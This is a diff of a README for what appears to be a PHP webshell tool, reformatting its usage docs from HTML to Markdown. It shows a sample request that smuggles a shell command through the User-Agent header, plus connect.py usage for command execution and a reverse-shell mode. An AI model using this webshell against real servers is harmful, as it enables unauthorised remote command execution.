@@ -5,24 +5,27 @@ code execution in the server
 
 and you can execute commands as in the example:
 
-<br>
-GET /webshell.php HTTP/1.1<br>
-<b>User-Agent: ls </b> <br>
-Host: example.com <br>
-Accept-Language: en-us <br>
-Accept-Encoding: gzip, deflate <br>
-Connection: Keep-Alive <br>
+```HTTP
+GET /webshell.php HTTP/1.1
+User-Agent: ls 
+Host: example.com 
+Accept-Language: en-us 
+Accept-Encoding: gzip, deflate 
+Connection: Keep-Alive 
+```
 
 
 
-
-<h1>How to use</h1>
+# How to use
 
 <b>default connection:</b>
 
+```bash
 python3 connect.py [webpage] [Argument]
+```
 
 <b>Reverse Shell connection:</b>
 
+```bash
 python3 connect.py [webpage] [Argument] [reverse_shell_ip] [reverse_shell_port]
-
+```
